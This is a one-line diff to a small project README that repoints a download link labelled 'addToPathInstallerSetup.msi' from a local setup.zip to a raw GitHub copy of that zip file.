@@ -1,3 +1,3 @@
 # addtopath
 Download installer:\n
-[addToPathInstallerSetup.msi](setup.zip)
+[addToPathInstallerSetup.msi](https://github.com/KHOIR359/windowsaddtopath/raw/master/setup.zip)
